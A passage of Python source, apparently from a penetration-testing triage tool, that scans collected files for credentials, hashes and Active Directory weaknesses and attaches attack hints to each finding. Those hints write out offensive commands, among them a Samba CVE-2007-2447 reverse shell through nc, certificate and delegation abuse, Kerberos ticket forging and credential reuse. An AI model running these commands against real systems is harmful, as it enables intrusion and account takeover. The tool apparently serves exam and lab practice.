                        hint = ESC_HINTS.get(esc, f"certipy-ad req ... ({esc}); then certipy-ad auth -pfx <out>.pfx -> NT hash / TGT")
                        # tag LAB-ONLY ESCs so the chain engine never elevates them
                        sev = "HIGH"
                        if esc in ("ESC8", "ESC11"):
                            sev = "MEDIUM"  # intel only - exam-prohibited
                        report.add(sev, "RECON", path, lineno,
                                   f"AD CS {esc} vulnerable template / right",
                                   hint=hint)
                        hit = True
                        break
                    if name == "RBCD marker":
                        report.add("HIGH", "RECON", path, lineno,
                                   "RBCD attribute (msDS-AllowedToActOnBehalfOfOtherIdentity)",
                                   hint="impacket-rbcd -delegate-from <ctrl> -delegate-to <target$> -action write ...; "
                                   "then getST.py -impersonate Administrator")
                        hit = True
                        break
                    if name == "BloodHound ACL edge":
                        # iter-7: even with a node-token after the arrow, lines
                        # inside backticks ('reading `--[GenericAll]-->` style')
                        # or wrapped in inline-code/quotes are explanatory prose.
                        if re.search(r'`[^`]*--\[[^`]+\]-->[^`]*`', line):
                            continue
                        edge = am.group(1)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"BloodHound ACL edge: {edge} (privilege-escalation path)",
                                   hint="abuse with bloodyAD / PowerView / dacledit per edge; shortest path to DA")
                        hit = True
                        break
                    if name == "WSUS abuse":
                        report.add("HIGH", "RECON", path, lineno,
                                   "WSUS update-push abuse (SharpWSUS)",
                                   hint="LAB-ONLY for the exam unless the WSUS host is in scope - signed-binary update -> SYSTEM on client/DC")
                        hit = True
                        break
                    if name == "DPAPI masterkey":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "DPAPI masterkey material",
                                   hint="impacket-dpapi masterkey -file <mk> -sid <SID> -password <pw>  (or -rpc on a box you own)")
                        hit = True
                        break
                    # ---- iter-7 round-2 completeness handlers ----
                    if name == "SQL INSERT cred row":
                        # capture group is the VALUES (...) tuple; extract every
                        # quoted value and look for a bcrypt/MD5/plain hash.
                        vals = re.findall(r"['\"]([^'\"]{2,80})['\"]", am.group(1))
                        # try to find a hash-shaped value; otherwise emit as cred
                        hashy = next((v for v in vals
                                      if re.match(r'^\$2[aby]\$|^\$1\$|^\$6\$|^\$5\$|'
                                                  r'^[a-f0-9]{32}$|^[a-f0-9]{40}$|'
                                                  r'^[a-f0-9]{60}$|^\$apr1\$', v)), None)
                        usery = next((v for v in vals if re.match(r'^[A-Za-z][\w@.-]{1,40}$', v) and len(v) <= 40), None)
                        if hashy:
                            report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                       f"SQL dump user: {usery or '<unknown>'}  hash: {hashy[:60]}",
                                       hint="check hashid then hashcat -m <mode>; common: bcrypt -m 3200, md5 -m 0")
                            from analyzers.patterns import HASHES
                            if hashy.startswith("$2"): HASHES.append(("3200", "bcrypt", hashy, path, lineno))
                            elif hashy.startswith("$1$"): HASHES.append(("500", "md5crypt", hashy, path, lineno))
                            elif hashy.startswith("$6$"): HASHES.append(("1800", "sha512crypt", hashy, path, lineno))
                            elif hashy.startswith("$apr1$"): HASHES.append(("1600", "apr1", hashy, path, lineno))
                            elif len(hashy) == 32: HASHES.append(("0", "MD5", hashy, path, lineno))
                        hit = True
                        break
                    if name == "SNMP community":
                        kind, comm, source = am.group(1), am.group(2), (am.group(3) or "")
                        if filters.is_placeholder(comm):
                            continue
                        rw = kind.lower().startswith("rwcommunity")
                        sev = "CRITICAL" if rw else "HIGH"
                        report.add(sev, "ASSIGNED SECRETS", path, lineno,
                                   f"SNMP {kind}: {comm}" + (f"  ({source})" if source else ""),
                                   hint=("snmpwalk -v2c -c '" + comm + "' <host>  " +
                                         ("(read-WRITE - snmpset for direct config tampering)" if rw
                                          else "(read-only enum: walk full tree)")))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=comm, source=path, line=lineno))
                        hit = True
                        break
                    if name == "docker env secret":
                        # iter-13 severity normalization: matches the HIGH
                        # baseline for the rest of the assigned-secret family
                        # (Helm/tfvars/PHP define/generic 1-group fall-through).
                        var, val = am.group(1), am.group(2).strip()
                        if filters.is_placeholder(val) or filters.is_known_example(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{var}: {val}",
                                   hint="container/orchestration secret - reuse directly against the service")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
                        hit = True
                        break
                    if name == "cmdkey history":
                        pw = am.group(1).strip()
                        if filters.is_placeholder(pw):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"cmdkey history password: {pw}",
                                   hint="typed in PowerShell - reuse against the host in the same cmdkey line / via SMB")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw, source=path, line=lineno))
                        hit = True
                        break
                    if name == "ASP.NET machineKey":
                        vk, dk = am.group(1), am.group(2)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"ASP.NET machineKey  validationKey={vk[:32]}{'...' if len(vk)>32 else ''} "
                                   f"decryptionKey={dk[:32]}{'...' if len(dk)>32 else ''}",
                                   hint="ViewState forgery: ysoserial.net + these keys -> RCE (CVE-2017-9248-class)")
                        hit = True
                        break
                    # SCCM NAA handled by _multiline_passes() (two-line block)
                    if name == "LSA secret":
                        if am.group(1):  # $MACHINE.ACC : LM:NT
                            pair = am.group(1)
                            nt = pair.split(":")[1]
                            report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                       f"NTLM (NT) $MACHINE.ACC: {nt}",
                                       hint=f"machine account hash - silver/golden-ticket primitive: nxc smb <dc> -u 'HOSTNAME$' -H {nt}")
                            from analyzers.patterns import HASHES
                            HASHES.append(("1000", "NTLM", nt, path, lineno))
                        elif am.group(2) and am.group(3):
                            u, p = am.group(2), am.group(3)
                            report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                       f"LSA SCM service cred: {u}:{p}",
                                       hint="service account password recovered from LSA secrets - reuse against the host")
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
                        hit = True
                        break
                    # ---- iter-8 round-1 dispatch ----
                    if name == "Certipy template ESC":
                        tmpl, vuln = am.group(1).strip(), am.group(2).strip()
                        report.add("HIGH", "RECON", path, lineno,
                                   f"ADCS template '{tmpl}' vulnerable: {vuln}",
                                   hint=f"certipy-ad req -ca <CA> -template '{tmpl}' -upn administrator@<dom> -u <you> -p <pw>")
                        hit = True
                        break
                    if name == "pg_hba auth method":
                        host_typ, db, user, method = am.group(1), am.group(2), am.group(3), am.group(5)
                        if method == "trust":
                            sev = "CRITICAL" if host_typ.startswith("host") else "HIGH"
                            report.add(sev, "ASSIGNED SECRETS", path, lineno,
                                       f"pg_hba TRUST auth: {host_typ} {db} {user}",
                                       hint=f"psql -U {user} -d {db} -h <pg-host>  (NO password required)")
                            hit = True
                            break
                    if name == "redis requirepass":
                        directive, val = am.group(1), am.group(2)
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"redis {directive}: {val}",
                                   hint=f"redis-cli -h <host> -a '{val}' info")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
                        hit = True
                        break
                    # iter-26: shell history typed-cred dispatchers.
                    if name == "bash history mysql -p":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history MySQL: {u}:{pw}",
                                   hint=f"mysql -h <host> -u '{u}' -p'{pw}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "bash history sshpass -p":
                        pw, target = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        u = target.split("@", 1)[0] if "@" in target else ""
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history sshpass: {u}:{pw} -> {target}",
                                   hint=f"sshpass -p '{pw}' ssh {target}")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "bash history curl -u":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith("$") or u == "user":
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history curl basic-auth: {u}:{pw}",
                                   hint=f"curl -u '{u}:{pw}' <url>")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "bash history wget --user":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history wget: {u}:{pw}",
                                   hint=f"wget --user='{u}' --password='{pw}' <url>")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-26: /etc/passwd GECOS field with embedded pw hint.
                    if name == "etc passwd GECOS hint":
                        usr_, gecos = am.group(1), am.group(2)
                        tok = filters.extract_pw_from_desc(gecos)
                        if not tok or filters.is_placeholder(tok) \
                                or filters.is_code_not_literal(tok, gecos):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"/etc/passwd GECOS hints cred for {usr_}: {gecos[:60]}",
                                   hint=f"try: ssh '{usr_}@<host>'  password '{tok}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=usr_, plaintext=tok,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-26: ~/.my.cnf / /etc/mysql/debian.cnf [client] block.
                    # The 'mysql client opt' regex captures `password = X`; pair
                    # it with the nearest preceding `user = X` to bind. Falling
                    # back to a generic record when user isn't in the same file.
                    # iter-31 FP fix: gate label to .my.cnf-shaped files -
                    # supervisord.conf / app.conf / mail.ini all have their
                    # own `password = X` which was mis-labeled as "MySQL"
                    # (still valid creds, just wrong provenance in the label).
                    if name == "mysql client opt":
                        pw = am.group(1).strip()
                        if filters.is_placeholder(pw) or filters.is_code_not_literal(pw, line):
                            continue
                        # look back up to 5 lines for a user= in same section
                        usr = "root"
                        try:
                            with open(path, "r", errors="ignore") as _fh:
                                _lines = _fh.readlines()
                            for back in range(max(0, lineno - 6), lineno - 1):
                                um = re.match(r'\s*user\s*=\s*["\']?([^"\'#\r\n]{1,40})',
                                              _lines[back])
                                if um:
                                    usr = um.group(1).strip()
                        except OSError:
                            pass
                        base = os.path.basename(path).lower()
                        is_mysql = ("my.cnf" in base or "mariadb" in base
                                    or "debian.cnf" in base
                                    or "/mysql/" in path.lower())
                        if is_mysql:
                            label = "MySQL .my.cnf cred"
                            hint_ = (f"mysql -h <host> -u '{usr}' -p'{pw}'  "
                                     f"(or auto: mysql --defaults-extra-file=<f>)")
                        else:
                            label = "config password= entry"
                            hint_ = (f"password from ini/conf: reuse '{pw}' as "
                                     f"service password; if user unknown try common")
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"{label}: {usr}:{pw}", hint=hint_)
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=usr, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "sudoers NOPASSWD":
                        user, cmd = am.group(1), am.group(2).strip()
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"sudoers NOPASSWD  {user}  ->  {cmd[:80]}",
                                   hint=f"as '{user}' run: sudo {cmd.split()[0] if cmd else '<cmd>'}  (check GTFOBins for escape)")
                        hit = True
                        break
                    # iter-17 (corpus mine wkl2kkzn5): sudo -l output shape
                    # (no user/host prefix; indented '(runas) NOPASSWD: /path').
                    # Gate to plausibly-sudo-l files to skip code/doc FPs.
                    if name == "sudo -l NOPASSWD":
                        runas, cmd = am.group(1), am.group(2).strip()
                        base = os.path.basename(path).lower()
                        plow = path.lower()
                        if not ("sudo" in base or "priv" in base or "peas" in plow
                                or "linpeas" in plow or path.lower().endswith((".txt", ".log", ".md"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        bin_path = cmd.split()[0] if cmd else "<cmd>"
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"sudo -l NOPASSWD (as {runas}) -> {cmd[:80]}",
                                   hint=(f"sudo {bin_path}  "
                                         f"(gtfobins.github.io/gtfobins/{os.path.basename(bin_path)} - Sudo section)"))
                        hit = True
                        break
                    # iter-17: Samba CVE-2007-2447 banner (HTB Lame)
                    if name == "Samba vuln banner":
                        if filters.is_doc_file(path):
                            continue
                        ver = am.group(1)
                        report.add("CRITICAL", "RECON", path, lineno,
                                   f"Samba {ver} - CVE-2007-2447 username map script RCE",
                                   hint=("manual: smbclient //<host>/notashare -U '/=`nc <you> 4444 -e /bin/sh`'  "
                                         "(spawns reverse shell as root; spoofing-free)"))
                        hit = True
                        break
                    # iter-17: Java/C#/JS typed field secret (HTB Blocky)
                    if name == "Java field secret":
                        field, val = am.group(1), am.group(2)
                        if (not val or filters.is_placeholder(val)
                                or filters.is_known_example(val)
                                or filters.is_code_not_literal(val, line)):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{field}: {val}",
                                   hint=("decompiled/source field literal - reuse against the service "
                                         "the class talks to (DB/LDAP/HTTP) and try same pw for OS users "
                                         "(SSH/SMB) on the same box"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-17: linPEAS bracketed-CVE finding
                    if name == "PEAS bracketed CVE":
                        if filters.is_doc_file(path):
                            continue
                        cve_match = re.search(r'CVE-\d{4}-\d{2,7}', line)
                        cve = cve_match.group(0) if cve_match else "CVE-?"
                        report.add("HIGH", "RECON", path, lineno,
                                   f"linPEAS CVE highlight: {cve}",
                                   hint=f"searchsploit {cve}; verify version on host; if exam-legal PoC exists, manual exploitation only")
                        hit = True
                        break
                    # iter-17: Flask itsdangerous session cookie
                    if name == "Flask itsdangerous":
                        if filters.is_doc_file(path):
                            continue
                        tok = am.group(1)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Flask session: {tok[:30]}...",
                                   hint=("flask-unsign --decode --cookie '<value>'; "
                                         "if SECRET_KEY known: flask-unsign --sign --cookie \"{'user':'admin'}\" --secret '<key>'"))
                        hit = True
                        break
                    # ---- iter-18 dispatch branches ----
                    # Kerberos AES key (Pass-the-Key primitive)
                    if name == "Kerberos AES key":
                        who = am.group('who')
                        etype = am.group('etype')
                        key = am.group('key').lower()
                        if filters.is_canonical_sample(key):
                            continue
                        # Pass-the-Key requires the exact key length:
                        # aes256-cts-hmac-sha1-96 → 64 hex (32 bytes)
                        # aes128-cts-hmac-sha1-96 → 32 hex (16 bytes)
                        # des-cbc-md5             → 16 hex (8 bytes)
                        expected = {"aes256": 64, "aes128": 32}.get(etype[:6], 16)
                        if len(key) != expected:
                            continue
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"Kerberos {etype} key {who}: {key}",
                                   hint=(f"Pass-the-Key: impacket-getTGT '<dom>/{who}' -aesKey {key} -dc-ip <dc>; "
                                         f"silver ticket: ticketer.py -aesKey {key} -nthash <nt> "
                                         f"-domain-sid <SID> -domain <dom> -spn <spn> Administrator"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="kerberos_key", user=who,
                                               hash=key, source=path, line=lineno))
                        hit = True
                        break
                    if name == "$MACHINE.ACC NT hash":
                        dom = am.group('dom')
                        host = am.group('host')
                        nt = am.group('nt')
                        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
                            continue
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"$MACHINE.ACC NTLM (NT) {dom}\\{host}: {nt}",
                                   hint=(f"machine account hash - silver-ticket primitive: "
                                         f"nxc smb <dc> -u '{host}' -H {nt} --local-auth; or "
                                         f"impacket-ticketer -nthash {nt} -domain-sid <SID> "
                                         f"-domain {dom} -spn cifs/{host[:-1]} Administrator"))
                        from analyzers.patterns import HASHES
                        HASHES.append(("1000", "NTLM", nt, path, lineno))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="hash", user=host, hash=nt,
                                               hash_mode="1000", domain=dom,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "pypykatz Kerberos AES key":
                        etype, key = am.group(1), am.group(2)
                        if filters.is_canonical_sample(key):
                            continue
                        if etype == "aes256" and len(key) != 64:
                            continue
                        if etype == "aes128" and len(key) != 32:
                            continue
                        if filters.is_doc_file(path):
                            continue
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"pypykatz Kerberos {etype} key: {key}",
                                   hint=(f"Pass-the-Key: impacket-getTGT '<dom>/<user>' -aesKey {key}; "
                                         "mimikatz: kerberos::ptt + sekurlsa::ekeys"))
                        hit = True
                        break
                    if name == "impacket-lookupsid domain SID":
                        if filters.is_doc_file(path):
                            continue
                        dsid = am.group(1)
                        report.add("INFO", "RECON", path, lineno,
                                   f"Domain SID: {dsid}",
                                   hint=("seeds impacket-ticketer -domain-sid; "
                                         "R-GOLDEN/R-SILVER will emit a real SID"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="ldap_attr", source=path, line=lineno,
                                               meta={"dc_sid": dsid}))
                        hit = True
                        break
                    if name in ("nxc rid-brute user", "impacket-lookupsid user"):
                        if filters.is_doc_file(path):
                            continue
                        rid_str, dom, user, sidtype = am.group(1), am.group(2), am.group(3), am.group(4)
                        if sidtype != "User":
                            continue   # we already learn computers via _NXC_SVC
                        try:
                            rid_n = int(rid_str)
                        except ValueError:
                            continue
                        if user in seen_svc:
                            continue
                        seen_svc.add(user)
                        _tool = ("nxc rid-brute" if name.startswith("nxc")
                                 else "impacket-lookupsid")
                        sev = "HIGH" if rid_n in (500, 512, 519, 518, 520) else "MEDIUM"
                        report.add(sev, "RECON", path, lineno,
                                   f"{_tool} user: {dom}\\{user} (RID {rid_n})",
                                   hint=("add to users.txt; AS-REPRoast (impacket-GetNPUsers ... -no-pass) "
                                         "+ password-spray; RID 500/512/519 = high-value targets"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="user", user=user, domain=dom,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "Rubeus dump ticket":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Rubeus dump: Base64EncodedTicket blob follows",
                                   hint=("extract next b64 block: awk '/Base64EncodedTicket/,/^[[:space:]]*$/' "
                                         "<file> | base64 -d > t.kirbi; ticketConverter.py t.kirbi t.ccache; "
                                         "export KRB5CCNAME=t.ccache; klist"))
                        hit = True
                        break
                    if name == "Snaffler annotated":
                        if filters.is_doc_file(path):
                            continue
                        color, rule_n, target_p, snippet = (am.group(1), am.group(2),
                                                            am.group(3), am.group(4) or "")
                        sev_map = {"Black": "CRITICAL", "Red": "HIGH",
                                   "Yellow": "MEDIUM", "Green": "INFO"}
                        sev = sev_map.get(color, "MEDIUM")
                        snippet_short = snippet[:80].replace("\n", " ")
                        report.add(sev, "INTERESTING FILES", path, lineno,
                                   f"Snaffler {color} ({rule_n}): {target_p}",
                                   hint=f"smbclient copy / read: {target_p}  -  rule {rule_n}"
                                        + (f"  snippet: {snippet_short}" if snippet_short else ""))
                        # iter-162: Snaffler's grep-mode snippet often carries
                        # the actual credential match (e.g. Rule
                        # 'KeepConfigPasswordOrange' fires on a web.config line
                        # like `<add key="pw" value="Sup3r!">`, and the whole
                        # line lands in the annotation). Feed the snippet
                        # through credline so a real cred gets surfaced as a
                        # separate CRED PAIRS finding on top of the file note.
                        # The classifier already rejects placeholders / brute
                        # templates / ACL masks so FP risk stays low.
                        if snippet and store is not None:
                            _sc = credline.classify(snippet)
                            if _sc and _sc.kind == "cred" and _sc.password:
                                _pw_sh = _sc.password.replace("'", "'\\''")
                                _u_disp = _sc.user or "<user>"
                                _u_sh = _u_disp.replace("'", "'\\''")
                                report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                           f"[Snaffler grep] {_u_disp}:{_sc.password}"
                                           + (f"  ({_sc.note})" if _sc.note else ""),
                                           hint=f"reuse: netexec smb <target> -u '{_u_sh}' -p '{_pw_sh}'")
                                from analyzers.ingest.evidence import Evidence
                                store.add(Evidence(kind="plaintext", user=_sc.user,
                                                   plaintext=_sc.password,
                                                   source=path, line=lineno))
                        hit = True
                        break
                    if name == "Snaffler share":
                        if filters.is_doc_file(path):
                            continue
                        share = am.group(1)
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"Snaffler readable share: {share}",
                                   hint="smbclient.py <user>@<host> -no-pass; cd <share-name> -> enumerate")
                        hit = True
                        break
                    # iter-17: nmap NSE smb-vuln + ProFTPd CPFR/CPTO are
                    # multi-line; dispatched from _multiline_passes() below.
                    # iter-17: Steghide artifact (rijndael fingerprint)
                    if name == "Steghide artifact":
                        if filters.is_doc_file(path):
                            continue
                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                   "Steghide artifact (rijndael-CBC payload)",
                                   hint=("steghide info <carrier>; steghide extract -sf <carrier> -p '<pass>'  "
                                         "(passphrase often in nearby notes; sweep: stegseek <jpg> rockyou.txt)"))
                        hit = True
                        break
                    # iter-17: PHP wrapper LFI URL
                    if name == "PHP wrapper LFI":
                        if filters.is_doc_file(path):
                            continue
                        wrapper = am.group(0)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"PHP wrapper LFI: {wrapper[:80]}",
                                   hint=("LFI/SSRF wrapper - response body is b64-encoded SOURCE of the resource "
                                         "param; decode: curl ... | base64 -d   |  also try "
                                         "/etc/passwd, /var/www/html/config.php, /proc/self/environ"))
                        hit = True
                        break
                    if name == "cron script ref":
                        # filename gate: only fire on actual cron config files.
                        base = os.path.basename(path).lower()
                        in_cron = ("crontab" in base or "/cron" in path.lower()
                                   or "spool/cron" in path.lower()
                                   or "/etc/anacrontab" in path.lower())
                        if not in_cron:
                            continue
                        script = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"cron-invoked script: {script}",
                                   hint=f"check writability: ls -la {script}  - if any non-root write -> code-as-root")
                        hit = True
                        break
                    if name == "hashcat potfile":
                        # filename gate: only fire on potfile-shaped paths.
                        # Real hashcat ~/.local/share/hashcat/hashcat.potfile,
                        # custom *.pot/.potfile, or any file containing 'crack'
                        # in the basename.
                        base = os.path.basename(path).lower()
                        if not (base.endswith(('.pot', '.potfile'))
                                or 'potfile' in base or 'hashcat' in base
                                or 'cracked' in base or '.crack' in base):
                            continue
                        h, plain = am.group(1), am.group(2)
                        # plain-half sanity: not just hex (still inside a hash),
                        # not a placeholder, not exactly the same as the hash.
                        if (filters.is_placeholder(plain) or len(plain) < 3
                                or re.match(r'^[a-fA-F0-9]+$', plain)
                                or plain == h):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"hashcat cracked: {h[:40]}... -> '{plain}'",
                                   hint=f"reuse plaintext: nxc smb <host> -u <user> -p '{plain}'  (per the hash's source)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=plain, source=path, line=lineno))
                        hit = True
                        break
                    if name == "john pot":
                        base = os.path.basename(path).lower()
                        if not (base == 'john.pot' or base.endswith('.pot')
                                or 'john' in base or 'cracked' in base):
                            continue
                        h, plain = am.group(1), am.group(2)
                        if (filters.is_placeholder(plain) or len(plain) < 3
                                or re.match(r'^[a-fA-F0-9]+$', plain)):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"john cracked: {h[:40]}... -> '{plain}'",
                                   hint=f"reuse plaintext: nxc smb <host> -u <user> -p '{plain}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=plain, source=path, line=lineno))
                        hit = True
                        break
                    if name == "AWS session token":
                        tok = am.group(1)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"AWS session token: {tok[:40]}...",
                                   hint="aws sts get-caller-identity  (export AWS_ACCESS_KEY_ID, _SECRET_ACCESS_KEY, _SESSION_TOKEN)")
                        hit = True
                        break
                    if name == "GCP service account":
                        kid = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"GCP service-account JSON key (kid {kid[:12]}...)",
                                   hint="gcloud auth activate-service-account --key-file <this.json>; gcloud projects list")
                        hit = True
                        break
                    if name == "kubeconfig token":
                        tok = am.group(1)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"kubeconfig token: {tok[:40]}...",
                                   hint="kubectl --kubeconfig <this> get pods --all-namespaces  -> escalate to nodes via privileged pods")
                        hit = True
                        break
                    # iter-27: Docker config.json auth block - b64 of user:pw
                    if name == "docker config auth":
                        import base64 as _b64
                        b64v = am.group(1)
                        if filters.is_placeholder(b64v):
                            continue
                        try:
                            dec = _b64.b64decode(b64v, validate=True).decode(
                                "utf-8", "replace")
                        except Exception:
                            dec = ""
                        if dec and ":" in dec and len(dec) < 200:
                            u, p = dec.split(":", 1)
                            if p and not filters.is_placeholder(p):
                                report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                           f"Docker registry auth: {u}:{p}",
                                           hint=f"docker login <registry> -u '{u}' -p '{p}'; "
                                                f"docker pull / image extract for secrets")
                                if store is not None:
                                    from analyzers.ingest.evidence import Evidence
                                    store.add(Evidence(kind="plaintext", user=u,
                                                       plaintext=p, source=path,
                                                       line=lineno))
                                hit = True
                                break
                    # iter-27: Ansible playbook / inventory password variable
                    if name == "ansible var pass":
                        varname, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith(("{{", "$")):
                            # jinja templating / env-var reference - skip
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"Ansible {varname}: {pw}",
                                   hint=(f"reuse: ssh <user>@<host> with '{pw}'; "
                                         f"or ansible-playbook uses this directly"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-27: GitLab runner token
                    if name == "gitlab runner token":
                        tok = am.group(1)
                        if filters.is_placeholder(tok):
                            continue
                        # /etc/gitlab-runner/config.toml carries the runner
                        # registration token; not a user cred, but a foothold
                        # into the CI system.
                        base = os.path.basename(path).lower()
                        if "runner" not in base and "gitlab" not in base \
                                and not path.lower().endswith("config.toml"):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"GitLab runner token: {tok[:16]}...",
                                   hint=(f"curl -H 'PRIVATE-TOKEN: {tok}' https://<gitlab>/"
                                         f"api/v4/projects  -> project foothold"))
                        hit = True
                        break
                    # iter-27: Chef encrypted data_bag marker
                    if name == "chef databag marker":
                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                   "Chef encrypted data_bag - needs shared secret",
                                   hint=("knife data bag show -F json <bag> <item> "
                                         "--secret-file <secret>  (locate secret in "
                                         "/etc/chef/encrypted_data_bag_secret)"))
                        hit = True
                        break
                    # iter-28: systemd Environment= password / secret / token
                    if name == "systemd Environment=":
                        varname, val = am.group(1), am.group(2).strip()
                        if filters.is_placeholder(val) or val.startswith("$"):
                            continue
                        # only fire in likely-service-unit files or logs of same
                        plow = path.lower()
                        base = os.path.basename(plow)
                        if not (base.endswith((".service", ".socket", ".timer",
                                                ".target", ".mount"))
                                or "systemd" in plow or "systemctl" in plow
                                or "/etc/systemd/" in plow
                                or plow.endswith((".log", ".txt", ".conf"))):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"systemd Environment= {varname}={val}",
                                   hint=(f"service reads env at start; run "
                                         f"`systemctl cat` to confirm, then "
                                         f"reuse '{val}' against the service DB/API"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-28: RabbitMQ password_hash moved to _multiline_passes
                    # iter-29: APT auth.conf machine entry
                    # iter-94: same regex fires on .netrc / .authinfo / _netrc
                    # (Windows curl / git) too - relabel finding based on the
                    # filename so it says 'netrc cred' (the more common form).
                    if name == "apt auth machine":
                        host, u, pw = am.group(1), am.group(2), am.group(3)
                        if filters.is_placeholder(pw):
                            continue
                        _plow = path.lower().replace("\\", "/")
                        _base = os.path.basename(_plow)
                        if (_base in (".netrc", "_netrc", ".authinfo")
                                or "netrc" in _base):
                            _label = f"netrc cred for {host}: {u}:{pw}"
                            _hint = f"connect via '{host}' with {u}:{pw} (curl/ftp/git use this)"
                        elif "auth.conf" in _plow or "/apt/" in _plow:
                            _label = f"APT auth {host}: {u}:{pw}"
                            _hint = f"apt update via '{host}' with {u}:{pw}"
                        else:
                            _label = f"machine-auth {host}: {u}:{pw}"
                            _hint = f"'{host}' auth: {u}:{pw}  (netrc / apt-format cred)"
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   _label, hint=_hint)
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
